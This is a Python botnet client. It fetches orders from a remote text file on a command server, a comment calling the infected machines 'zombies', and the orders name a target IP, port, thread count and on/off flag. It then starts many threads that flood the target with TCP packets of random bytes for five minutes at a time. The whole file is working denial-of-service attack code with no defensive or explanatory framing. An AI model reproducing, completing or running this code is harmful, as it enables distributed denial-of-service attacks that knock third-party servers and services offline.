import requests
import random
import socket
import threading
import time
def getdata():
    burp0_url = "txt_url_to_get_commands" #Zombies get their orders from a txt file on a web server.
    
    data = requests.get(burp0_url)

    return data.text.split('\r\n')


def tcp(ip,port,times):
    data = random._urandom(16)
    t_end = time.time() + 300
    while time.time() < t_end:
        try:
		    # TCP = SOCK_STREAM
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(data)
            for x in range(times):
                s.send(data)

        except Exception as e:
            s.close()
            if Exception == KeyboardInterrupt:
                break

def mainloop():
    while True:
        try: 
            print(getdata())
            ip, port, times, threadn, isOpen = getdata()
            port = int(port)
            times = int(times)
            threadn = int(threadn)
            isOpen = int(isOpen)
            # tcp(ip,port,times)
            if isOpen:

                threads = []
                for i in range(threadn):
                    thread = threading.Thread(target=tcp, args=(ip,port,times),)
                    threads.append(thread)

                for i in range(threadn):
                    threads[i].start()
                for i in range(threadn):
                    threads[i].join()
                    print(f'{i} joined')
            else:
                print('Not open.')
                time.sleep(10)
        except Exception as e:
            print(e)
def wothreading():
    print(getdata())
    ip, port, times, threadn = getdata()
    port = int(port)
    times = int(times)
    tcp(ip,port,times)

if __name__ == '__main__':
    mainloop()
    #wothreading()